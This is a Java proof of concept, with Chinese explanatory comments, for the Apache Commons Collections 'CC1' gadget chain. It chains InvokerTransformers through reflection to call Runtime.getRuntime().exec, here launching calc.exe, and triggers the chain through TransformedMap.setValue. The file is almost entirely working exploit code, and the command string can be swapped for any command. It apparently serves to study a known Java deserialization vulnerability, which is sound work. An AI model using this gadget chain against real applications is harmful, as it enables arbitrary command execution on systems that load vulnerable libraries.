package CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

/*
1、transform数组里面含有4个实现了Transformer接口的对象，这四个对象都重写了transform()方法
2、ChianedTransformer里面装了4个transform,ChianedTransformer也实现了Transformer接口，同样重写了transform()方法
3、TransoformedMap绑定了ChiandTransformer，给予map数据转化链，当map里的数据进行修改时，需经过ChiandTransformer转换链
4、利用TransoformedMap的setValue修改map数据，触发ChiandTransformer的transform()方法
5、ChianedTransformer的transform是一个循环调用该类里面的transformer的transform方法

loop 1：第一次循环调用ConstantTransformer("java.Runtime")对象的transformer方法，调用参数为"test"(正常要修改的值)，返回了java.Runtime作为下一次循环的object参数
loop 2：第二次循环调用InvokerTransformer对象的transformer，参数为("java.Runtime")，包装Method对象"getMethod"方法，invoke方法获得对象所声明方法"getRuntime"，利用反射，返回一个Rumtime.getRuntime()方法
loop 3：第三次循环调用InvokerTransformer对象的transformer，参数为("Rumtime.getRuntime()")，包装Method对象"invoke"方法，利用反射，返回一个Rumtime.getRuntime()实例
loop 4：第四次循环调用InvokerTransformer对象的transformer，参数为一个Runtime的对象实例，包装Method对象"exec"方法，invoke方法获得对象所声明方法"calc.exe"，利用反射，执行弹出计算器操作
*/

public class CC_chain {
    public static void main(String[] args) throws Exception {
        //1、创建Transformer型数组，构建漏洞核心利用代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //2、将transformers数组存入ChaniedTransformer类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //3、创建Map，给予map数据转化链
        Map innerMap = new HashMap();
        innerMap.put("key", "value");
        //给予map数据转化链,该方法有三个参数:
        // 第一个参数为待转化的Map对象
        // 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
        // 第三个参数为Map对象内的value要经过的转化方法（可为单个方法，也可为链，也可为空）
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        //4、触发漏洞利用链，利用漏洞
        onlyElement.setValue("test");
    }
}